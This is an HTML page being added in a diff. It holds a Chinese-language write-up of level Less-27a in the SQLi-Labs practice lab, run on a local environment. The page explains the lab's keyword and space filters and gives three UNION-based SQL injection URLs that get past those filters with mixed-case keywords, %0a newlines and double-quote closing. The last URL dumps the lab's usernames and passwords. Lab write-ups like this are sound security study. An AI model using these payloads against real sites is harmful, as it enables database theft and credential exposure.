@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-27a 双引号与极致过滤绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-27a 双引号与极致过滤绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 绕过过滤, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-27a (GET - Trick with SELECT & UNION)</li>
+        <li><strong>提示：</strong>双引号闭合，混合大小写与换行符绕过，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Less-27 的变种。后台 SQL 语句的结构为 <code>id="$id"</code>，因此闭合符从单引号变成了<b>双引号 <code>"</code></b>。</p>
+    <p><strong>过滤机制（同 L27）：</strong></p>
+    <ul>
+        <li>使用正则过滤了 <code>select</code>、<code>SELECT</code>、<code>Select</code>（<code>union</code> 同理）。</li>
+        <li>过滤了空格（<code>[ +]</code>）和注释符（<code>#</code>、<code>--</code>）。</li>
+        <li>屏蔽了报错回显，只能使用联合查询（UNION）。</li>
+    </ul>
+    <p><strong>绕过策略：</strong></p>
+    <ul>
+        <li>关键字使用<b>混合大小写</b>（如 <code>UnIoN</code>、<code>SeLeCt</code>）。</li>
+        <li>空格使用<b>换行符 <code>%0a</code></b> 替代。</li>
+        <li>由于无法注释，使用 <code>||"</code> 在末尾进行<b>对称闭合</b>，补齐原语句尾部的双引号。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：爆库名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0"UnIoN%0aSeLeCt%0a1,database(),3||"</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列显示 <code>security</code>。</p>
+
+    <p><strong>第二步：爆表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0"UnIoN%0aSeLeCt%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()||"</code></p>
+    <p><strong>回显现象：</strong>页面显示 <code>emails,referrers,uagents,users</code>。</p>
+
+    <p><strong>第三步：直接脱库</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0"UnIoN%0aSeLeCt%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0awhere%0a1=1||"</code></p>
+    <p><strong>回显现象：</strong>成功爆出所有用户的账号和密码（包含 <code>admin:p@ssw0rd</code>）。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>闭合符的误判：</strong>习惯了 L27 的单引号，很容易顺手写出 <code>||'</code>，在这个双引号关卡中会导致语法错误。</li>
+        <li><strong>空格过滤的平替：</strong>在 URL 中，<code>%0a</code> 是绕过空格过滤的绝佳利器。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>关键字对抗</strong>：利用正则匹配的局限性，使用混合大小写绕过。</li>
+        <li><strong>对称闭合的泛用性</strong>：在无法注释时，根据原始代码的闭合符（单/双引号）精准补齐逻辑。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
